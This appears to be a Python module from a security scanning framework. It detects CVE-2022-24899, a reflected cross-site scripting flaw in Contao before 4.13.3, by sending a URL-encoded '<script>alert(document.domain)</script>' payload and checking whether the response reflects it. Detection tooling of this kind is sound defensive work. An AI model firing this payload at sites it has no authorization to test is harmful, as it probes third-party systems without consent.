#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Contao prior to 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Contao <4.13.3 - Cross-Site Scripting Detection',
        'description': 'Contao prior to 4.13.3 contains a cross-site scripting vulnerability. It is possible to inject arbitrary JavaScript code into the canonical tag.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'contao', 'xss', 'huntr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/df46e285-1b7f-403c-8f6c-8819e42deb80/',
            'https://github.com/contao/contao/security/advisories/GHSA-m8x6-6r63-qvj2',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-24899',
            'https://contao.org/en/security-advisories/cross-site-scripting-via-canonical-url.html',
            'https://github.com/contao/contao/commit/199206849a87ddd0fa5cf674eb3c58292fd8366c',
        ],
        'cve': 'CVE-2022-24899',
    }

    def run(self):
        r = self.http_request(method="GET", path='/contao/%22%3e%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"></script><script>alert(document.domain)</script>', '"Not authenticated"',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Contao <4.13.3 - Cross-Site Scripting detected",
                path='/contao/%22%3e%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

